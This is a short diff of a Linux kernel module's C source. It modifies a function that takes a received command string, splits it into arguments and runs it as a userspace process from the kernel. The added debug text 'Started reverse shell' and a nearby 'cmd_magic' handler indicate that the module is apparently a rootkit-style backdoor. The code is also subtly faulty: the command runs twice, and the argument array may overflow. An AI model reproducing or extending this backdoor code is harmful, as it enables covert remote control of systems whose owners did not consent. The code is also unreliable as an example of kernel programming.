@@ -15,19 +15,27 @@ static int parse_argv(char *cmd, char ***dest) {
     (*dest)[argc] = token;
     argc++;
   }
+  (*dest)[argc] = NULL;
   printk(KERN_INFO "Argc: %d\n", argc);
   return argc;
 }
 
 static void cmd_userspace_shell(char *cmd, size_t n)
 {
+  static char *envp[] = {
+    "HOME=/",
+    "TERM=linux",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
   char **argv = kmalloc(sizeof(char *) * n, GFP_USER);
   printk(KERN_INFO "Running shell command\n");
   parse_argv(cmd + strlen(CMD_SHELL) + 1, &argv);
   printk(KERN_INFO "Parsing successful\n");
   call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);
   printk(KERN_INFO "Ran command\n");
+  int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
   kfree(argv);
+  debug("Returned from process with %d", err);
+  debug("Started reverse shell\n");
 }
 
 static void cmd_magic(char *cmd, size_t n)
